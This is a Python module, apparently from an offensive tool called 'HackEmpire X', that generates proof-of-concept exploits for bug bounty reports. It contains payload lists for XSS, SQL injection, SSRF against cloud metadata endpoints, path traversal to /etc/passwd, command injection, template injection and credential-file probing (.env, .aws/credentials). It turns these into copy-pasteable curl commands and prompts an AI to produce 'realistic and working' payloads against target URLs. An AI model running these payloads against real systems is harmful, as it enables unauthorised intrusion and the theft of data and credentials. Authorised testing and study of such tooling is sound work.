"""
PoCGenerator — Auto Proof-of-Concept generator for HackEmpire X.

Phase 3 feature: For every verified vulnerability, generate a working
PoC that can be directly used in a bug bounty report.

PoC types supported:
  - XSS (reflected, stored, DOM)
  - SQLi (error-based, blind, union)
  - SSRF (internal, OOB via interactsh)
  - LFI / Path Traversal
  - RCE / Command Injection
  - IDOR
  - Open Redirect
  - SSTI
  - Misconfiguration (exposed .env, .git, phpinfo)

Each PoC includes:
  - HTTP request (curl command)
  - Payload used
  - Expected response
  - Impact statement
  - Remediation
"""
from __future__ import annotations

import json
import logging
from dataclasses import dataclass, field
from typing import Any

from hackempire.core.models import Vulnerability

logger = logging.getLogger(__name__)


@dataclass
class ProofOfConcept:
    vuln_name: str
    severity: str
    url: str
    payload: str
    curl_command: str
    expected_response: str
    impact: str
    remediation: str
    steps_to_reproduce: list[str] = field(default_factory=list)
    ai_generated: bool = False


# ---------------------------------------------------------------------------
# Static PoC templates (offline fallback — no AI needed)
# ---------------------------------------------------------------------------

_POC_TEMPLATES: dict[str, dict[str, Any]] = {
    "xss": {
        "payloads": [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(document.domain)>",
            "'\"><svg onload=alert(document.domain)>",
            "javascript:alert(document.domain)",
        ],
        "impact": "An attacker can execute arbitrary JavaScript in the victim's browser, "
                  "leading to session hijacking, credential theft, or malicious redirects.",
        "remediation": "Encode all user-supplied input before rendering in HTML. "
                       "Implement Content-Security-Policy headers.",
        "steps": [
            "Navigate to the vulnerable URL",
            "Insert the XSS payload into the vulnerable parameter",
            "Observe JavaScript execution in the browser",
        ],
    },
    "sqli": {
        "payloads": [
            "' OR '1'='1",
            "' OR 1=1--",
            "1' AND SLEEP(5)--",
            "1 UNION SELECT NULL,NULL,NULL--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        ],
        "impact": "An attacker can read, modify, or delete database contents, "
                  "bypass authentication, or execute OS commands via the database.",
        "remediation": "Use parameterized queries / prepared statements. "
                       "Never concatenate user input into SQL queries.",
        "steps": [
            "Identify the vulnerable parameter",
            "Insert the SQLi payload",
            "Observe database error or time delay confirming injection",
            "Use sqlmap to extract data: sqlmap -u 'URL' -p 'PARAM' --dbs",
        ],
    },
    "ssrf": {
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/",
            "http://localhost/admin",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
        ],
        "impact": "An attacker can access internal services, cloud metadata endpoints, "
                  "or internal admin panels not exposed to the internet.",
        "remediation": "Validate and whitelist allowed URLs. Block requests to internal IP ranges. "
                       "Use a URL allowlist.",
        "steps": [
            "Find a URL/endpoint parameter in the application",
            "Replace the value with the SSRF payload",
            "Observe the response for internal data",
            "Use interactsh for OOB detection: interactsh-client",
        ],
    },
    "lfi": {
        "payloads": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ",
        ],
        "impact": "An attacker can read arbitrary files from the server, "
                  "including configuration files, credentials, and source code.",
        "remediation": "Validate file paths against a whitelist. "
                       "Use realpath() and check the result is within the allowed directory.",
        "steps": [
            "Find a file inclusion parameter (e.g. ?page=, ?file=, ?include=)",
            "Replace the value with the LFI payload",
            "Observe /etc/passwd or other sensitive file contents in the response",
        ],
    },
    "rce": {
        "payloads": [
            "; id",
            "| id",
            "` id`",
            "$(id)",
            "; cat /etc/passwd",
            "& whoami",
        ],
        "impact": "An attacker can execute arbitrary OS commands on the server, "
                  "leading to full system compromise.",
        "remediation": "Never pass user input to OS commands. "
                       "Use safe APIs instead of shell execution.",
        "steps": [
            "Find a parameter that is passed to an OS command",
            "Append the RCE payload",
            "Observe command output in the response",
            "Use commix for automated exploitation: commix --url='URL'",
        ],
    },
    "idor": {
        "payloads": [
            "Change id=1 to id=2",
            "Change user_id=100 to user_id=101",
            "Change /api/users/me to /api/users/1",
            "Change order_id=ABC to order_id=XYZ",
        ],
        "impact": "An attacker can access or modify other users' data "
                  "without authorization.",
        "remediation": "Implement proper authorization checks on every object access. "
                       "Use indirect object references (UUIDs instead of sequential IDs).",
        "steps": [
            "Log in as User A and note your object ID",
            "Log in as User B",
            "Access User A's object using User B's session",
            "Observe unauthorized data access",
        ],
    },
    "open_redirect": {
        "payloads": [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://target.com@evil.com",
            "javascript:alert(1)",
        ],
        "impact": "An attacker can redirect users to malicious sites for phishing, "
                  "credential harvesting, or malware distribution.",
        "remediation": "Validate redirect URLs against a whitelist of allowed domains. "
                       "Never redirect to user-supplied URLs directly.",
        "steps": [
            "Find a redirect parameter (e.g. ?next=, ?url=, ?redirect=)",
            "Replace the value with the malicious URL",
            "Observe the browser redirecting to the attacker's site",
        ],
    },
    "ssti": {
        "payloads": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
        ],
        "impact": "An attacker can execute arbitrary code on the server "
                  "through the template engine, leading to RCE.",
        "remediation": "Never render user input as a template. "
                       "Use sandboxed template environments.",
        "steps": [
            "Find a parameter that is rendered in a template",
            "Insert {{7*7}} — if response shows 49, SSTI is confirmed",
            "Escalate to RCE using engine-specific payloads",
            "Use tplmap for automated exploitation: tplmap -u 'URL'",
        ],
    },
    "misconfig": {
        "payloads": [
            "/.git/config",
            "/.env",
            "/phpinfo.php",
            "/server-status",
            "/actuator/env",
            "/.aws/credentials",
        ],
        "impact": "Exposed configuration files may contain credentials, "
                  "API keys, database passwords, or internal infrastructure details.",
        "remediation": "Remove sensitive files from web root. "
                       "Configure web server to deny access to hidden files.",
        "steps": [
            "Navigate to the exposed URL",
            "Observe sensitive configuration data in the response",
        ],
    },
}


def _classify_vuln(vuln: Vulnerability) -> str:
    """Map vulnerability name to a PoC template key."""
    name = vuln.name.lower()
    if "xss" in name or "cross-site scripting" in name:
        return "xss"
    if "ssrf" in name or "server-side request" in name:
        return "ssrf"
    if "rce" in name or "remote code" in name or "command injection" in name:
        return "rce"
    if "sql" in name or "sqli" in name or ("injection" in name and "command" not in name and "template" not in name):
        return "sqli"
    if "lfi" in name or "path traversal" in name or "local file" in name:
        return "lfi"
    if "idor" in name or "insecure direct" in name or "broken object" in name:
        return "idor"
    if "redirect" in name or "open redirect" in name:
        return "open_redirect"
    if "ssti" in name or "template injection" in name:
        return "ssti"
    if "misconfig" in name or "exposed" in name or "disclosure" in name:
        return "misconfig"
    return "misconfig"  # default


def _build_curl(url: str, payload: str, vuln_type: str) -> str:
    """Build a curl command demonstrating the PoC."""
    safe_url = url.rstrip("/")
    # Skip curl for IDOR — it's a manual process
    if vuln_type == "idor":
        return f"# Manual: {payload}"
    if vuln_type in ("xss", "sqli", "lfi", "ssti", "open_redirect"):
        sep = "&" if "?" in safe_url else "?"
        # URL-encode single quotes in payload for shell safety
        safe_payload = payload.replace("'", "%27")
        return f"curl -sk '{safe_url}{sep}q={safe_payload}'"
    if vuln_type == "ssrf":
        sep = "&" if "?" in safe_url else "?"
        safe_payload = payload.replace("'", "%27")
        return f"curl -sk '{safe_url}{sep}url={safe_payload}'"
    if vuln_type == "rce":
        sep = "&" if "?" in safe_url else "?"
        safe_payload = payload.replace("'", "%27")
        return f"curl -sk '{safe_url}{sep}cmd={safe_payload}'"
    if vuln_type == "misconfig":
        # payload is a path like /.git/config
        clean_path = payload if payload.startswith("/") else f"/{payload}"
        return f"curl -sk '{safe_url}{clean_path}'"
    return f"curl -sk '{safe_url}' -d 'payload={payload}'"


class PoCGenerator:
    """
    Generates working Proof-of-Concept for discovered vulnerabilities.

    Usage:
        gen = PoCGenerator(ai_engine=ai_engine)
        pocs = gen.generate(vulns)
    """

    def __init__(self, ai_engine: Any = None, emitter: Any = None) -> None:
        self._ai = ai_engine
        self._emitter = emitter

    def generate(self, vulns: list[Vulnerability]) -> list[ProofOfConcept]:
        """Generate PoC for each vulnerability. Never raises."""
        pocs = []
        for vuln in vulns:
            try:
                poc = self._generate_one(vuln)
                pocs.append(poc)
                # v4.6 — emit poc_ready event for Dashboard PoCPreview panel
                if self._emitter is not None:
                    try:
                        self._emitter.emit_poc_ready({
                            "curl_command": poc.curl_command,
                            "affected_url": poc.url,
                            "vuln_name": poc.vuln_name,
                            "payload": poc.payload,
                        })
                    except Exception:  # noqa: BLE001
                        pass
            except Exception as exc:
                logger.warning(f"[poc_gen] Failed for {vuln.name}: {exc}")
        return pocs

    def generate_one(self, vuln: Vulnerability) -> ProofOfConcept:
        """Generate PoC for a single vulnerability."""
        poc = self._generate_one(vuln)
        # v4.6 — emit poc_ready event for Dashboard PoCPreview panel
        if self._emitter is not None:
            try:
                self._emitter.emit_poc_ready({
                    "curl_command": poc.curl_command,
                    "affected_url": poc.url,
                    "vuln_name": poc.vuln_name,
                    "payload": poc.payload,
                })
            except Exception:  # noqa: BLE001
                pass
        return poc

    # ── Internal ─────────────────────────────────────────────────────────

    def _generate_one(self, vuln: Vulnerability) -> ProofOfConcept:
        # Try AI first
        if self._ai is not None:
            ai_poc = self._ai_generate(vuln)
            if ai_poc is not None:
                return ai_poc

        # Fallback to static templates
        return self._static_generate(vuln)

    def _ai_generate(self, vuln: Vulnerability) -> ProofOfConcept | None:
        """Ask AI to generate a working PoC."""
        try:
            prompt = self._build_poc_prompt(vuln)
            # Use public verify_finding if available, else _send as fallback
            if hasattr(self._ai, "verify_finding"):
                # verify_finding returns float — not suitable here, use _send
                pass
            if not hasattr(self._ai, "_send"):
                return None
            response = self._ai._send(prompt)
            if response.get("status_code") != 200 or not response.get("raw_text"):
                return None
            return self._parse_poc_response(vuln, response["raw_text"])
        except Exception as exc:
            logger.debug(f"[poc_gen] AI PoC failed: {exc}")
            return None

    def _build_poc_prompt(self, vuln: Vulnerability) -> str:
        return (
            "You are an elite bug bounty hunter writing a Proof of Concept.\n\n"
            f"Vulnerability: {vuln.name}\n"
            f"Severity: {vuln.severity}\n"
            f"URL: {vuln.url}\n"
            f"Evidence: {(vuln.evidence or 'none')[:400]}\n"
            f"CWE: {', '.join(vuln.cwe_ids) if vuln.cwe_ids else 'unknown'}\n\n"
            "Generate a working Proof of Concept for this vulnerability.\n\n"
            "OUTPUT FORMAT (strict JSON only):\n"
            "{\n"
            '  "payload": "the exact payload to use",\n'
            '  "curl_command": "curl -sk \'URL?param=PAYLOAD\'",\n'
            '  "expected_response": "what the response will show",\n'
            '  "impact": "what an attacker can do",\n'
            '  "remediation": "how to fix it",\n'
            '  "steps": ["step 1", "step 2", "step 3"]\n'
            "}\n\n"
            "RULES: Output ONLY valid JSON. Make the payload realistic and working. "
            "The curl command must be copy-pasteable."
        )

    def _parse_poc_response(self, vuln: Vulnerability, raw_text: str) -> ProofOfConcept | None:
        try:
            text = raw_text.strip()
            brace = text.find("{")
            if brace == -1:
                return None
            data = json.loads(text[brace:])
            if not isinstance(data, dict):
                return None
            return ProofOfConcept(
                vuln_name=vuln.name,
                severity=vuln.severity,
                url=vuln.url,
                payload=str(data.get("payload", "")),
                curl_command=str(data.get("curl_command", "")),
                expected_response=str(data.get("expected_response", "")),
                impact=str(data.get("impact", "")),
                remediation=str(data.get("remediation", "")),
                steps_to_reproduce=data.get("steps", []),
                ai_generated=True,
            )
        except Exception:
            return None

    def _static_generate(self, vuln: Vulnerability) -> ProofOfConcept:
        """Generate PoC from static templates."""
        vuln_type = _classify_vuln(vuln)
        template = _POC_TEMPLATES.get(vuln_type, _POC_TEMPLATES["misconfig"])
        payload = template["payloads"][0]
        # Use evidence as payload only if it looks like an actual payload (not prose)
        if vuln.evidence and len(vuln.evidence) < 150:
            evidence = vuln.evidence.strip()
            if any(c in evidence for c in ["<", "'", "=", "../", "{{", "$(", "; "]):
                payload = evidence
        return ProofOfConcept(
            vuln_name=vuln.name,
            severity=vuln.severity,
            url=vuln.url,
            payload=payload,
            curl_command=_build_curl(vuln.url, payload, vuln_type),
            expected_response=f"Response confirms {vuln.name} vulnerability",
            impact=template["impact"],
            remediation=template["remediation"],
            steps_to_reproduce=list(template["steps"]),
            ai_generated=False,
        )
